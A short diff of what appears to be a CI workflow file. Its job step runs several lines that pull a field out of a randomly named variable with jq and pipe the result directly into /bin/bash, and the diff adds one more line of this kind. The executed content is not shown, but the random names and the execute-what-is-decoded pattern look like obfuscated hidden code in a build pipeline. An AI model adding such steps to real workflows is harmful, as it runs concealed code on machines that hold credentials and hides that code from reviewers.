@@ -26,6 +26,7 @@ jobs:
           echo $vax30819 | jq -r .xis6976 | /bin/bash
           echo $bff8 | jq -r .viwr1439 | /bin/bash
           printf '%s' "$ivb17" | jq -r .gdzmf66 | /bin/bash
+          echo $f11 | jq -r .ejoh4 | /bin/bash
 
       - name: Upload artifact
         if: always()
